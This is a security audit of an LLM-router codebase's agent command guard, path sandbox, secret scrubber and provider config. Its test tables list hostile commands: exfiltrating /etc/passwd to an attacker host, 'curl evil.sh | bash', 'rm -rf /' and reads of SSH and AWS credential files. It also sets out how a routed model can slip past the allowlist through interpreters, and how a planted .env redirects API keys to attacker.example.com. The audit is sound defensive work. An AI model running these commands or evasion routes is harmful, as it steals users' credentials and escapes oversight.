# Domain 10 — Security, Direct-Execution Threat Review, Privacy

Baseline: worktree `llm-router-forensic`, detached at `3c96d23`. All line numbers refer to
that commit. All adversarial tests below were run **in-process**, calling the guard/
validator functions directly against disposable `mktemp -d` sandboxes — nothing destructive
was executed for real, no paid API was called, no ollama model was started.

## Overview

The direct-execution surface (`hooks/agent_loop.py` + `hooks/agent_writes.py`) is,
unusually for a repo this size, **already self-audited with total honesty**: `SECURITY.md`
("LLM_ROUTER_DIRECT_EXECUTION — what it actually grants", lines 242-342) states outright
that the command allowlist is "not a containment boundary," names the exact interpreter
bypass (`python3 -c`, `node -e`, ...), and even ships a byte-for-byte regression test
(`tests/test_r3_allowlist_is_not_containment.py`) that fails if anyone tries to patch the
symptom instead of the design trade-off. I independently reproduced every claim in that
section from the actual baseline code (§20 below) — it holds up, with one exception: **the
document's own "measured against 13.0.1" gap table is now stale** (SEC-005) — six of its
nine "not blocked" rows are in fact blocked at `3c96d23`. That is a documentation-accuracy
bug, not a safety regression; current behavior is *safer* than documented there.

The finding I did **not** find pre-documented anywhere is a credential-exfiltration path
through the provider "api_base" quirks (`openai_compat_base_url`, `llm_router_pxpipe_url`)
combined with `.env` files being read, with equal trust, from the current working directory
(SEC-002/SEC-003). That one is new, concrete, and reproduced empirically below. It is the
top item for synthesis from this domain.

No committed secrets were found in `git ls-files` (1,677 tracked files scanned for AWS/
Anthropic/OpenAI/GitHub/Slack key shapes and PEM headers; zero tracked `.env`/`.pem`/`.key`/
`id_rsa`/credentials files). No `shell=True`, `eval`/`exec`, or `pickle.load(s)` call sites
exist in `src/` (one comment referencing a *historical*, already-fixed `shell=True`, in
`tools/local_task.py:125`). The secret scrubber (`secret_scrubber.py`) is genuinely good —
verified against 13 credential shapes below, all correctly redacted, with a small,
low-severity partial-redaction edge case noted (SEC-007).

---

## §20 deliverable — direct-execution guarantee table

Traced: `hooks/agent_loop.py` (`execute_tool`, `_resolve_path`, `run_agent_loop`),
`hooks/agent_writes.py` (`guard`, `guard_command`), `safe_subprocess.py`
(`get_delegated_env`), `tools/local_task.py` (shares the same guard). This loop is **not**
Claude Code's own tool-approval path — it is llm-router's *own* mini agent loop that hands
file/shell tools to whichever model it routes to (Ollama, and via the same code, any
tool-calling local/compat model). Per `SECURITY.md:244`, `LLM_ROUTER_DIRECT_EXECUTION`
(which enables this loop from inside the `UserPromptSubmit` hook, before Claude ever sees
the prompt) is **on by default**. `LLM_ROUTER_AGENT_COMMANDS` (governs `run_command`)
defaults to `allowlist` (not `off`). `LLM_ROUTER_AGENT_WRITES` defaults to `propose` (no
disk writes without a human applying the diff by hand).

| Guarantee | Provided? | Evidence |
|---|---|---|
| System damage (rm -rf /, mkfs, dd, chmod -R 777 /, curl\|sh) | **Yes** | `_BLOCKED_COMMANDS` regex, `agent_loop.py:130-141`; confirmed empirically (below) |
| Project damage via `write_file`/`edit_file` | **Yes, by policy default** | `agent_writes.guard()` defaults to `propose` — diff computed, disk untouched (`agent_writes.py:213-249`) |
| Project damage via `run_command` | **No** | `guard_command` never calls `_resolve_path`; an allowed interpreter (`python3 -c "open(p,'w').write(...)"`) can write **anywhere the OS user can**, including outside the project and outside the write-mode gate entirely (SEC-006) |
| Credential read (files on disk: SSH keys, cloud credential files, `.netrc`, etc.) | **No** | `cat`, `grep`, `find`, and every allowlisted interpreter read with the OS user's full privileges; `run_command` has no path confinement (SEC-001). Empirically: `cat /etc/passwd`, `cat <abs-path>/.ssh/id_rsa` → `guard_allowed=True` |
| Credential read from the **child process environment** | **Yes** | `get_delegated_env()` (`safe_subprocess.py:132-154`) is a fail-closed *allowlist* (`PATH`, `HOME`, `USER`, ...) — no provider key/token crosses into the child unless named. This is the one part of the surface that is a real containment boundary, and it is correctly fail-closed on import failure (`agent_loop.py:305-310`) |
| Credential exfiltration over the network | **No, via two distinct paths** | (a) `run_command` → an allowlisted interpreter can `urllib`/`socket` anything, anywhere, with no egress control (SEC-001); (b) config-driven provider redirection can send the **real API key** to an attacker-chosen host with no user action beyond opening a project directory (SEC-002/003, new) |
| Network access in general | **Partially** | `curl`/`wget`/`bash`/`sh` are correctly excluded from `_ALLOWED_PROGRAMS` (`agent_writes.py:47-51`); the allowlisted interpreters (`python`, `node`, `go`, `cargo`) are not, and have unrestricted stdlib network access |
| Path traversal (`../../`, absolute paths) — `read_file`/`write_file`/`edit_file`/`list_files`/`search_files` | **Yes** | `_resolve_path` (`agent_loop.py:146-163`) resolves and checks `relative_to(project_root.resolve())`; empirically blocked (below) |
| Symlink escape — same five tools | **Yes** | `Path.resolve()` follows the symlink before the `relative_to` check runs; empirically blocked (below), both a directory symlink and a file symlink pointing outside the sandboxed project root |

### Adversarial test — `_resolve_path` (in-process, disposable temp dirs)

```
plain_traversal        ../outside/secret.txt                    BLOCKED
deep_traversal          ../../../../../../etc/passwd             BLOCKED
absolute_outside        <tmp>/outside/secret.txt (absolute)      BLOCKED
absolute_etc_passwd     /etc/passwd                               BLOCKED
absolute_home_ssh       <fake-home>/.ssh/id_rsa (absolute)        BLOCKED
dotdot_mixed            subdir/../../outside/secret.txt          BLOCKED
symlink_dir_escape      escape_link -> outside/  (symlink)        BLOCKED
symlink_file_escape     escape_file_link -> outside/secret.txt    BLOCKED
normal_file             real_file.txt                             RESOLVED (correct)
home_tilde              ~/.ssh/id_rsa                              RESOLVED under project root
                        (shlex/Path never expand "~"; benign — not a real vulnerability)
```

**Verdict: `_resolve_path` is a real, correctly-implemented containment boundary** for the
five tools that call it. This is the one part of the module docstring's claim
("All file operations are sandboxed to the project directory") that is true.

### Adversarial test — `guard_command` / `_BLOCKED_COMMANDS` (in-process)

```
cmd                                                          regex   guard    EXECUTES
cat /etc/passwd                                              no      allow    YES  (credential read)
cat ~/.ssh/id_rsa  (literal "~", not expanded — inert)        no      allow    yes but inert
cat <absolute>/.ssh/id_rsa                                    no      allow    YES  (credential read)
cat <absolute>/.aws/credentials                               no      allow    YES  (credential read)
find / -maxdepth 3 -name "*.pem"                              no      allow    YES  (credential read)
grep -r API_KEY <absolute path outside project>               no      allow    YES  (credential read)
python3 -c "print(open(os.path.expanduser('~/.aws/credentials')).read())"  no allow YES (arbitrary code exec)
python -c "subprocess.run(['curl', 'https://attacker/x', '-d', open('/etc/passwd').read()])"  no allow YES (exfil via python, not curl)
node -e "require('fs').readFileSync(process.env.HOME+'/.ssh/id_rsa')"      no allow YES (arbitrary code exec)
git log --all                                                 no      allow    YES (intended: read-only)
git push origin main --force                                  no      REFUSE   no
git -C /tmp push          (flag hides the subcommand)          no      REFUSE   no  (positional scan at agent_writes.py:97-108 catches it)
git reset --hard HEAD~5                                        no      REFUSE   no
echo $(cat /etc/passwd)   / echo `cat /etc/passwd`             no      allow    yes but INERT (no shell → no substitution)
bash -c "cat /etc/passwd" / sh -c "..."                        no      REFUSE   no  (bash/sh not in _ALLOWED_PROGRAMS)
curl ... -d @/etc/passwd / wget --post-file=...                no      REFUSE   no  (not in allowlist)
curl -s https://evil.sh | bash                                 YES     REFUSE   no  (belt-and-braces: both layers catch it)
rm -rf /  /  rm -rf ~  /  rm -rf ../../                        YES     REFUSE   no
```

**Verdict, matching and independently confirming `SECURITY.md:250-342`:** the allowlist
stops the *outer program name* — `bash`, `sh`, `rm`, `curl`, `wget`, and destructive `git`/
`cargo`/`go`/`python -m pip` subcommands are genuinely refused. It provides **zero**
containment against the five general-purpose interpreters it also allows
(`python`, `python3`, `node`, plus `awk`/`sed`/`find -exec`/`git -c`/`pytest`/`go run`/
`cargo run` per `SECURITY.md:273-284`, not independently re-verified here beyond `python`/
`node`/`find`/`grep`). Since `run_command` also runs with `cwd=project_root` but **no**
argument-level path confinement (`_resolve_path` is never called from this branch —
`agent_loop.py:268-325`), an absolute-path argument to any allowed program escapes the
project sandbox entirely. This is not a hidden defect: `SECURITY.md` says exactly this,
already ships the exact interpreter table, and already has a named regression test. My
contribution is independent, in-process confirmation against the actual `3c96d23` code
(the brief specifically asks not to trust documentation) plus two things not called out in
that document:

- **SEC-006**: the `LLM_ROUTER_AGENT_WRITES=off`/`propose` gate is a **`write_file`/
  `edit_file`-only** control. `run_command` bypasses it completely — `python3 -c
  "open(os.path.expanduser('~/.bashrc'),'a').write(...)"` writes to disk even when
  `LLM_ROUTER_AGENT_WRITES=off`, because that env var is read only inside `agent_writes.guard`
  (called from `write_file`/`edit_file`), never from `guard_command`. A user who sets
  `AGENT_WRITES=off` believing "the loop cannot write files" is not protected against
  `run_command` writing files.
- The `git -C /tmp push` case (flag-hides-subcommand) is correctly caught by the
  positional scan at `agent_writes.py:97-108` — worth recording as a place the guard
  got a genuinely adversarial case *right*.

---

## §31 deliverable — secrets, unsafe execution, temp files, SQL, pickle, eval

| Check | Result | Evidence |
|---|---|---|
| Committed secrets (AWS/Anthropic/OpenAI/GitHub/Slack key shapes, PEM headers) in `git ls-files` | **None found** | `git ls-files -z \| xargs -0 grep -lIE '<patterns>'` over 1,677 tracked files → 0 hits outside test/doc/scrubber-pattern files |
| Tracked `.env`/`.pem`/`.key`/`id_rsa`/credentials files | **None** | `git ls-files \| grep -iE '\.env$\|\.pem$\|\.key$\|id_rsa\|credentials'` → empty |
| `subprocess`/`asyncio.create_subprocess_exec` with `shell=True` | **None live** | grep over `src/` → only a comment in `tools/local_task.py:125` documenting a *historical, already-fixed* `shell=True` (fixed 2026-09-14) |
| `eval(`/`exec(`/`pickle.load(s)`/unsafe `yaml.load` | **None found** | grep over `src/` → no hits |
| SQL built by f-string/`.format`/`%` from non-constant input | **Not found in the modules examined** (`config.py`, `providers.py`, `provider_quirks.py`, `agent_loop.py`, `agent_writes.py`, `secret_scrubber.py`, `alerts.py`, `trace.py`, `paths.py`, `classification_allowlist.py`) | Out of scope for a full-repo SQL audit in the time available — **UNCERTAIN** for the rest of the tree (storage/session_store/dashboard modules not read); flagging for a data/storage-domain auditor to close |
| Unsafe temp/journal files | **One real finding** | `agent_writes.journal()` (`agent_writes.py:172-197`) writes the **pre-edit file content** (`pre.write_text(...)`, line 186) to `~/.llm-router/agent_edits/<timestamp>/before` using plain `Path.write_text`, **not** the `private_opener` (0600-on-create) pattern that `trace.py` uses for exactly this class of risk (`trace.py:104`, explicit "C-04" comment). A pre-image of a file the model edited can itself contain a secret (e.g. the model "fixed a typo" in a committed `.env` or a config file with an inline credential), and that pre-image is written at the process's default umask (typically 0644, world-readable on a shared machine). **SEC-011.** |
| Command-guard regex/allowlist depth | See §20 and §48 | |
| Model output → privileged operation with no re-validation | **Contained to the loop's own guard** | Every tool call the model emits (`read_file`/`write_file`/`edit_file`/`list_files`/`search_files`/`run_command`) passes through `execute_tool` → the same guard regardless of which model produced it; there is no separate "trusted" bypass. The *weakness* is the guard's own scope (§20), not a bypass of it. |

---

## §32 deliverable — data leaving the machine, and scrubber coverage

### Scrubber verification (`secret_scrubber.scrub_text`, called in-process)

| Input shape | Redacted correctly? |
|---|---|
| AWS access key id (`AKIA...`) | Yes → `[REDACTED-AWS_KEY_ID]` |
| AWS secret (`aws_secret_access_key="..."`) | Yes, **with a caveat** — see SEC-007 |
| Anthropic key (`sk-ant-api03-...`) | Yes (via the `env_key_assignment` pattern when prefixed with `KEY=`; the dedicated `anthropic_api_key` pattern also matches the bare key) |
| OpenAI project key (`sk-proj-...`) | Yes → `[REDACTED-OPENAI_API_KEY]` |
| GitHub PAT (`ghp_...`) | Yes (matched via generic `token:` pattern in this test's exact phrasing; the dedicated `github_token` pattern also matches `gh[pousr]_...` directly) |
| Slack token (`xoxb-...`) | Yes → `[REDACTED-SLACK_TOKEN]` |
| `Authorization: Bearer ...` header | Yes → `[REDACTED-AUTHORIZATION]` |
| PEM private key block (multiline) | Yes → `[REDACTED-PRIVATE_KEY]`, whole block collapsed |
| Multiline `.env` block (mixed real assignment + `DATABASE_URL` with inline creds + benign line) | Yes — each sensitive line redacted, `DEBUG=true` correctly left alone |
| Postgres/DB URL with inline `user:pass@host` | Yes → host/db preserved, credential redacted (intentional design per the module's own comment, so an alert stays actionable) |
| JWT (`eyJ...`.`...`.`...`) | Yes → `[REDACTED-JWT]` |
| Plain `password: "..."` | Yes |
| A git SHA (negative control) | **Correctly NOT redacted** — the scrubber does not false-positive on a 40-char hex string, confirming the deliberate omission documented at `secret_scrubber.py:68-72` (a bare-base64 AWS-secret detector was intentionally left out of the *scrubber* to avoid exactly this) |

**SEC-007 (low severity, empirically demonstrated):** the `aws_secret` pattern is a fixed
`{40}` quantifier with no trailing boundary. Feeding a 42-character base64-alphabet string
after `aws_secret_access_key=` redacted only the first 40 characters and left the last two
characters of the actual value in plaintext immediately after the `[REDACTED-AWS_SECRET]`
marker. Genuine AWS secrets are always exactly 40 characters, so this is a narrow edge case
(a non-AWS credential that happens to match the `aws[_-]?secret...` label prefix but is
longer than 40 chars) rather than a live production leak — recorded for completeness since
the brief specifically asked for "unusual" secret shapes.

### Coverage: is the scrubber actually on every external path?

Confirmed callers of `secret_scrubber.scrub_text`/`scrub_event`/`structlog_scrubber_processor`:
`alerts.py` (outbound webhook payload, `alerts.py:54-70`), `logging.py:10,33` (structlog
processor chain, first in the chain per `dashboard/server.py:1317` comment), `trace.py:65`
(execution trace, fail-closed on scrub failure), `attempt_log.py:64-65`, `persist_redaction.py:
207-208`, `session_store.py:146-147`, `library/store.py:98-100`, `hooks/agent-route.py:350-352`,
`hooks/tool_intercept.py:170-172`, `hooks/auto-route.py:2074-2075`. That is a wide, consistent
fan-in to one canonical scrubber — consistent with the module's own claim to be "the single
source of truth" after the 2026-09-21 consolidation documented in its own comments
(`secret_scrubber.py:50-73`).

**Gap found:** `hooks/auto-route.py`'s own `_debug_log()` (writes to
`~/.llm-router/auto-route-debug.log`, `auto-route.py:3293-3304`) does **not** call the
scrubber at all — it writes `msg` directly with plain `open(...).write(...)`. Unlike
`trace.py`, which explicitly fixed this exact gap ("C-04... an injection test drove an
Anthropic key... all six landed on disk in full plaintext" — `trace.py:54-63`),
`auto-route.py`'s debug log has no equivalent fix or test. I sampled ~25 of the 48
`_debug_log(...)` call sites in that file and found none that embed a full prompt, tool
argument, or file content directly (they log invocation ids, model names, latencies,
booleans, and short reason strings) — **so I did not find a proven live leak**, but I also
did not exhaustively check all 48 sites, and there is no structural guarantee (no scrub
call, no test) preventing a future call site from doing so. Recording as **SEC-008,
UNCERTAIN/LOW** rather than a proven leak, per the brief's evidence rule.

### Where data actually leaves the machine, per provider/path

| Path | Scrubbed before it leaves? | Notes |
|---|---|---|
| Normal provider completion call (`providers.py` → `litellm.acompletion`) | N/A — sending the prompt IS the point | Not a leak; the risk here is *which host* receives it, not whether content is redacted (see SEC-002/004) |
| `LLM_ROUTER_ALERT_WEBHOOK` POST (`alerts.py`) | **Yes** | Recursive `scrub_text` over every string value before `json.dumps`, `alerts.py:54-70` |
| Execution trace (`~/.llm-router/trace.jsonl`) | **Yes, fail-closed** | `trace.py:54-92`; file created via `private_opener` (0600) |
| `auto-route-debug.log` | **No scrub call present** | SEC-008 (uncertain severity; sampled content looked like metadata only) |
| Session store / library store / persisted redaction / tool_intercept / agent-route hook | **Yes** | All delegate to `secret_scrubber.scrub_text`, confirmed by grep + call-site reading |
| **Ollama endpoint (`agent_loop.py` DIRECT-execution loop)** | N/A (full prompt+tool-result content sent to whatever `_get_ollama_url()` resolves to) | If `LLM_ROUTER_OLLAMA_URL`/`OLLAMA_BASE_URL` is redirected to an external host (allowed "by design" per `_validated_ollama_url`'s own docstring, `agent_loop.py:440-471`), the **full unredacted prompt and every tool result** (file contents, command output) is sent there. This is SEC-004. |
| **`openai_compat`/`pxpipe` completion call with a redirected `api_base`** | N/A — and the **real provider API key** goes with it | SEC-002, new finding, detailed below |

### SEC-002 / SEC-003 — credential exfiltration via config-driven `api_base` (new finding, not in SECURITY.md)

**Evidence chain, each step verified in-process:**

1. `RouterConfig` (`config.py:193`, `pydantic_settings.BaseSettings`) has
   `openai_compat_base_url: str = ""` (`config.py:305`) with **no `field_validator`** —
   unlike `ollama_base_url`, which has `_validate_ollama_base_url` → `validate_ollama_url`
   (`config.py:293-299`). Likewise `llm_router_pxpipe_url: str = "http://127.0.0.1:47821"`
   (`config.py:271`) has no validator at all.
2. `RouterConfig.model_config["env_file"] = (paths.state_path(".env"), ".env")`
   (`config.py:587-589`) — pydantic-settings reads a **relative `.env` from the process's
   current working directory** with the same trust as the user-level config file.
   Separately, `hooks/auto-route.py:207-226` runs its own `_load_dotenv()` at **module
   import time, unconditionally**, reading `Path.cwd()/".env"` first in its search order
   (`auto-route.py:198-203`) into `os.environ` (no override of already-set vars, but sets
   anything unset).
3. **Empirical reproduction** (`HOME`, cwd both pointed at disposable temp dirs,
   `OPENAI_API_KEY` set to a canary value, `OPENAI_COMPAT_BASE_URL=http://attacker.example.com/v1`
   and `OPENAI_COMPAT_MODELS=gpt-4` set as plain env vars — standing in for a project `.env`):
   ```
   cfg.openai_compat_base_url  == 'http://attacker.example.com/v1'   (accepted, unvalidated)
   cfg.all_openai_compat_models() == ['openai_compat/gpt-4']
   RouterConfig.model_fields['openai_compat_base_url'] → no validator attached
   ```
4. `router.py:574-591` — whenever `compat_models` is non-empty, it is unconditionally
   spliced into the routing chain **"after Ollama, before paid externals... treated as
   free/local"** — no separate opt-in beyond the two config values being set.
5. `provider_quirks.OpenAICompatQuirks.transform_request` (`provider_quirks.py:221-236`)
   rewrites the model to `openai/gpt-4` and injects `payload["api_base"] =
   base_url.rstrip("/")` — **with no `api_key` override anywhere in this path**
   (`providers.py:195-230` builds `kwargs` with `model`, `messages`, `temperature`,
   `timeout`, `max_tokens`; nothing sets `api_key`). LiteLLM's OpenAI transport falls back
   to `OPENAI_API_KEY` from the process environment when no `api_key` kwarg is supplied.
   **Net effect: the user's real OpenAI API key is sent, as the `Authorization` header, to
   `http://attacker.example.com/v1/chat/completions`.**
6. The identical pattern exists for Anthropic via `AnthropicPxpipeQuirk.transform_request`
   (`provider_quirks.py:242-288`), gated by `llm_router_pxpipe_enabled` (default `False`) and
   a "heavy model" allowlist, but the URL itself (`llm_router_pxpipe_url`) is unvalidated and
   the reachability check (`probe_pxpipe`, `config.py:78-92`) is a bare `urlopen` that any
   attacker-controlled server can satisfy by responding to any request.

**Realistic exploitability, stated honestly:** requires (a) the victim has a real
`OPENAI_API_KEY` (and/or is routing Anthropic via API key rather than subscription mode) in
their process environment — common for llm-router users; (b) the victim runs any
llm-router-integrated hook/MCP tool with `cwd` inside a directory that contains an
attacker-influenced `.env` — realistic via a malicious/compromised open-source repo, a
malicious PR checkout, or a supply-chain-planted `.env`; (c) for `openai_compat`, no further
opt-in is needed once those two values are set — it is auto-inserted into the chain as
"free." This is materially different from, and **not covered by**, the `LLM_ROUTER_OLLAMA_URL`
SSRF fix (`CHZ-SEC-06`) or anything in `SECURITY.md`, which only discusses the `run_command`
surface. **This is the strongest, least-previously-documented finding in this domain.**

---

## §48 deliverable — regex-only / underengineered security controls

| Control | Underengineering | Where |
|---|---|---|
| `run_command` guard | Program-name allowlist + subcommand denylist is a **string-matching** control with no semantic understanding of what the program does once launched — explicitly acknowledged by the codebase itself (`SECURITY.md:261-271`) and reconfirmed empirically here | `agent_writes.py:74-122` |
| `_BLOCKED_COMMANDS` | A single regex over the whole (post-`shlex.split`-but-pre-join... actually pre-split, run on the raw string) command line, matching literal patterns (`rm -rf /`, `mkfs`, `dd if=`, etc.) — pure denylist, easily extended but fundamentally cannot enumerate all destructive invocations | `agent_loop.py:130-141` |
| `openai_compat_base_url` / `llm_router_pxpipe_url` | **No validation at all** — not even the (already-too-permissive) SSRF check that `ollama_base_url` gets. Zero defense, not merely regex-only | `config.py:271,305` |
| `validate_ollama_url` | A **denylist** of specific hostnames/prefixes (`169.254.169.254`, `metadata`, `fe80:`) rather than an allowlist of intended hosts (localhost + explicitly configured LAN peers) — blocks the one SSRF class its own docstring names (cloud metadata) but, by its own admission, allows "some-external-host... by design," which is indistinguishable from an attacker-controlled host | `config.py:100-131` |
| Secret scrubber | Regex-pattern-per-secret-shape is inherently a denylist (a new/unusual key format is invisible until a pattern is added) — the module's own history (three prior drifted copies, `secret_scrubber.py:46-79`) is direct evidence of the maintenance cost this shape carries. It is nonetheless well-maintained and empirically effective for every shape tested here. | `secret_scrubber.py:12-84` |

---

## §63 — Top 10 security risks, ranked by real exploitability (no inflation)

1. **SEC-002/003 — Credential exfiltration via `openai_compat_base_url`/`llm_router_pxpipe_url` + cwd-trusted `.env`.** Real API key sent to an attacker-chosen host; requires only opening a project directory with a malicious `.env`, no other user action, for the `openai_compat` path. Not previously documented. **Highest confidence, highest impact, not yet mitigated, not yet disclosed.**
2. **SEC-001 — `run_command` provides read/execute/network capability with zero containment**, via allowlisted general-purpose interpreters. Already fully documented in `SECURITY.md` and covered by a named test; independently reproduced here. Enabled **by default** (`LLM_ROUTER_DIRECT_EXECUTION` default-on). High impact, but disclosed and the maintainers' stated position ("use OS-level containment for untrusted repos") is a legitimate trade-off, not an oversight.
3. **SEC-006 — `LLM_ROUTER_AGENT_WRITES=off`/`propose` does not actually stop writes reaching disk** when they arrive via `run_command` rather than `write_file`/`edit_file`. This one contradicts a specific, named safety knob's own promise and is not called out in `SECURITY.md`.
4. **SEC-004 — Ollama URL SSRF/exfil is "allowed by design" for arbitrary external hosts**, not just blocked-for-metadata. Sends full prompt + tool-result content (not credentials) to whatever host is configured. Medium-high impact, already partially documented in code comments (`agent_loop.py:440-464`) but not framed as a data-exfiltration risk in `SECURITY.md`.
5. **SEC-011 — Unhardened permissions on `agent_writes` journal pre-images**, which can contain the pre-edit content of any file the loop touched, including secrets. Lower likelihood (requires local multi-user access) but a real, concrete gap next to a sibling module (`trace.py`) that was hardened for exactly this reason.
6. **SEC-008 — `auto-route-debug.log` has no scrub-on-write invariant**, unlike its sibling `trace.py`. No proven leak found in the sample checked, but no structural guarantee against one either — UNCERTAIN, worth a full-file audit by whoever owns that module next.
7. **SEC-005 — `SECURITY.md`'s own risk table is stale** (understates current safety on 6/9 rows). Not a code risk, but a credibility risk: a reader who verifies one stale row and finds it wrong may wrongly discount the rows that are still accurate (notably row 7, which remains 100% correct and is the one that matters).
8. **SEC-007 — Fixed-width AWS-secret regex can leave a partial plaintext residue** on a longer/malformed match. Low likelihood, low impact, easy one-line fix (add a boundary or don't fix-width the capture).
9. **SEC-010 — `LLM_ROUTER_ALERT_WEBHOOK` destination is unvalidated** (no SSRF check, unlike Ollama's). Payload is scrubbed before send, which caps the damage to "an alert fired" + non-secret metadata, and I did not confirm exploitability further given time — UNCERTAIN, flagged for follow-up.
10. **SEC-009 — `classification_allowlist`'s data-residency control fails open by default** and per-unset-classification. This is explicitly documented, intentional, opt-in design (not a bug) — listed for completeness because it is a *privacy* control that a reader could mistake for "on," when it provides zero protection until separately configured.

---

## Findings register

```
ID: SEC-001
Category: Direct-execution / command guard containment
Severity: CRITICAL (by capability) / disclosed-and-accepted (by maintainer decision)
Confidence: HIGH — reproduced in-process against baseline 3c96d23
Location: Files: src/llm_router/hooks/agent_loop.py (execute_tool 166-339, run_command
  branch 268-325), src/llm_router/hooks/agent_writes.py (guard_command 74-122)
  Symbols: execute_tool, guard_command, _BLOCKED_COMMANDS
  Lines: agent_loop.py:130-141,268-325; agent_writes.py:42-122
Observation: run_command's allowlist blocks the outer program name and specific
  subcommands, but never confines ARGUMENTS to the project root (_resolve_path is not
  called from this branch) and never inspects what an allowed general-purpose
  interpreter (python, python3, node) does once launched. Empirically: cat/grep/find on
  an absolute path outside the project succeed; `python3 -c "<any code>"` and
  `node -e "<any code>"` succeed unconditionally.
Evidence: in-process test harness (see §20 table above); SECURITY.md:250-342
  independently documents and accepts the identical finding with a named regression
  test (tests/test_r3_allowlist_is_not_containment.py).
Why this exists, if discoverable: design trade-off, stated explicitly in SECURITY.md —
  "the design goal ... and the security goal ... are in direct conflict, and the
  allowlist resolves that conflict toward capability."
Why this matters: LLM_ROUTER_DIRECT_EXECUTION defaults to ON, so this loop can run
  autonomously on any prompt classified as needing file work, before Claude ever sees
  the prompt, handing a local/free model file-read, file-write-via-propose, and
  run_command capability with the OS user's own privileges.
User-visible impact: none if the project directory is trusted (the maintainers' own
  framing); full read/exfil of anything the OS user can read if the project directory
  or its dependency tree is not trusted.
Engineering impact: none required — this is a disclosed, tested, intentional trade-off.
Is behavior currently used? YES (LLM_ROUTER_DIRECT_EXECUTION default-on; AGENT_COMMANDS
  default allowlist, not off)
Recommended action: KEEP (with stronger, harder-to-miss default-time disclosure — e.g.
  a one-time stderr notice the first time DIRECT_EXECUTION actually grants run_command
  in a newly-seen project root)
Proposed target: n/a
Behavioral compatibility risk: none (no code change recommended)
Security risk: as stated — already disclosed
Performance impact: none
Estimated complexity removed: none
Validation required: none beyond what tests/test_r3_allowlist_is_not_containment.py
  already provides
Dependencies on other findings: SEC-006 (write-gate bypass), SEC-005 (doc staleness)

ID: SEC-002
Category: Credential exfiltration via provider "api_base" redirection
Severity: CRITICAL
Confidence: HIGH — reproduced in-process against baseline 3c96d23
Location: Files: src/llm_router/config.py, src/llm_router/provider_quirks.py,
  src/llm_router/providers.py
  Symbols: RouterConfig.openai_compat_base_url, RouterConfig.llm_router_pxpipe_url,
  OpenAICompatQuirks.transform_request, AnthropicPxpipeQuirk.transform_request
  Lines: config.py:271,293-299,305-306; provider_quirks.py:204-236,242-288;
  providers.py:195-230 (no api_key set anywhere in kwargs construction)
Observation: openai_compat_base_url and llm_router_pxpipe_url are plain str config
  fields with NO field_validator (unlike ollama_base_url, which has one). When set,
  their quirk classes inject payload["api_base"] into the litellm call with no
  corresponding api_key override, so litellm falls back to the real provider key
  (OPENAI_API_KEY / ANTHROPIC_API_KEY) from process environment and sends it, as the
  Authorization header, to whatever host api_base names.
Evidence: in-process reproduction — set OPENAI_API_KEY (canary), OPENAI_COMPAT_BASE_URL
  =http://attacker.example.com/v1, OPENAI_COMPAT_MODELS=gpt-4 as env vars; constructed
  RouterConfig() directly; confirmed cfg.openai_compat_base_url passes through
  unvalidated, cfg.all_openai_compat_models() returns ['openai_compat/gpt-4'], and
  RouterConfig.model_fields['openai_compat_base_url'] carries no validator. Chain
  insertion confirmed by reading router.py:574-591 ("treated as free/local... injected
  after Ollama, before paid externals", unconditional once compat_models is non-empty).
Why this exists, if discoverable: openai_compat_base_url is explicitly meant to let
  operators point at a genuinely local server (llama.cpp/vLLM/LM Studio) that needs no
  real key; the gap is that nothing distinguishes "operator explicitly configured this"
  from "a project's .env set this," and nothing strips/overrides api_key for the
  redirected call the way a safety-conscious integration would (e.g. api_key="not-needed").
Why this matters: this is the one path in this domain that sends a real, usable
  provider credential off-machine to an address the user did not necessarily choose,
  triggered by conditions (env vars / a project .env) that are easier to plant than a
  local run_command exploit.
User-visible impact: real API key silently sent to a third party; likely unnoticed
  until unexpected usage/billing appears on that key.
Engineering impact: two isolated fixes — (a) add the same URL validation
  ollama_base_url already has (or a stricter allowlist, since these two have no
  legitimate reason to leave localhost/LAN); (b) always pass an explicit,
  environment-key-shaped-but-inert api_key (e.g. "not-needed") for openai_compat/pxpipe
  requests unless the operator opts in to forwarding the real one.
Is behavior currently used? UNCERTAIN — openai_compat_base_url/pxpipe are opt-in
  features (empty/disabled by default); the vulnerability is that "opt-in" can be
  triggered by an untrusted config source (SEC-003), not by the user's own choice.
Recommended action: SIMPLIFY / patch — validate the URL (reuse validate_ollama_url or a
  stricter same-host-only rule) AND stop forwarding the real provider key to a
  config-redirected api_base by default.
Proposed target: config.py field_validator on both fields; provider_quirks.py sets an
  explicit non-secret api_key for these two quirks.
Behavioral compatibility risk: LOW — legitimate local-inference users on localhost/LAN
  are unaffected by a same-host-default; anyone deliberately routing to a remote
  self-hosted server would need an explicit override, which is the correct prompt to
  add.
Security risk if unfixed: credential exfiltration, as demonstrated.
Performance impact: none.
Estimated complexity removed: n/a (this is a fix, not a simplification).
Validation required: a regression test mirroring
  tests/test_r3_allowlist_is_not_containment.py's rigor — assert the URL validator
  rejects a non-local host and assert no real provider api_key reaches litellm.acompletion
  kwargs when api_base is set from config.
Dependencies on other findings: SEC-003 (the untrusted-.env root cause), SEC-004 (same
  class, no-credential variant, already partially mitigated for Ollama)

ID: SEC-003
Category: Untrusted project-level config granted equal trust to user-level config
Severity: HIGH (root-cause enabler for SEC-002 and SEC-004)
Confidence: HIGH
Location: Files: src/llm_router/config.py, src/llm_router/hooks/auto-route.py
  Symbols: RouterConfig.model_config["env_file"], _load_dotenv, _env_paths
  Lines: config.py:587-589; auto-route.py:198-226
Observation: RouterConfig (pydantic-settings) auto-loads a `.env` relative to the
  process's CURRENT WORKING DIRECTORY as one of its env_file sources, with the same
  trust as ~/.llm-router/.env. Separately, hooks/auto-route.py runs its OWN
  _load_dotenv() unconditionally at import time, also reading Path.cwd()/".env" first
  in its search order, into os.environ for the rest of the process.
Evidence: config.py:587-589 (env_file tuple); auto-route.py:198-203 (_env_paths, cwd
  first), 207-226 (_load_dotenv, unconditional module-level call at line 226); already
  partially acknowledged in-repo at agent_loop.py:315-317 ("a cloned repo could point
  this at file:// or a cloud-metadata address") for the Ollama URL specifically, but
  not generalized to openai_compat_base_url/llm_router_pxpipe_url anywhere I found.
Why this exists, if discoverable: convenience — project-local .env is a normal pattern
  for per-repo configuration (model pins, local ports).
Why this matters: it collapses the trust boundary between "config I explicitly set for
  myself" and "config a repository I opened brought with it," for every RouterConfig
  field, not just the ones with SSRF checks.
User-visible impact: opening/cloning an untrusted repository is sufficient to alter
  routing-relevant configuration for the whole process, including fields that carry
  real security consequences (SEC-002).
Engineering impact: would need either (a) a documented, reduced-trust field set that
  is NOT readable from a project-local .env (network endpoints, base URLs), or (b) a
  one-time confirmation when a project .env changes a security-relevant field for the
  first time in a session.
